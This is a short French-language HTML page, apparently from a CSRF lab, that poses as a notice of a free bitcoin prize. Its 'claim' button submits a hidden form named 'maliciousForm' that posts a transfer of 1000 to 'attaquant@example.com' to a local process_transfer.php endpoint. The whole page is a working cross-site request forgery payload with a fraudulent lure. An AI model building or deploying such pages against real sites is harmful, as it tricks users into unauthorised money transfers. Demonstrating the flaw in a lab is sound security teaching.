<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Notification de Gain</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f0f0f0;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background-color: #fff;
      border-radius: 8px;
      padding: 20px;
      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
      text-align: center;
    }

    h1 {
      color: #007bff;
    }

    p {
      color: #333;
      margin-bottom: 20px;
    }

    .claim-button {
      background-color: #007bff;
      color: #fff;
      border: none;
      border-radius: 4px;
      padding: 10px 20px;
      font-size: 16px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    .claim-button:hover {
      background-color: #0056b3;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Félicitations !</h1>
    <p>Vous avez gagné 1 BTC gratuit ! Cliquez sur le bouton ci-dessous pour réclamer votre prix.</p>
    
    <form action="http://localhost/sans-csrf/process_transfer.php" method="POST" id="maliciousForm">
      <input type="hidden" name="recipientEmail" value="attaquant@example.com">
      <input type="hidden" name="amount" value="1000">
    </form>
    
    
    
    <button  class="claim-button" onclick="document.getElementById('maliciousForm').submit()">Réclamer Prix</button>  </div>
</body>
</html>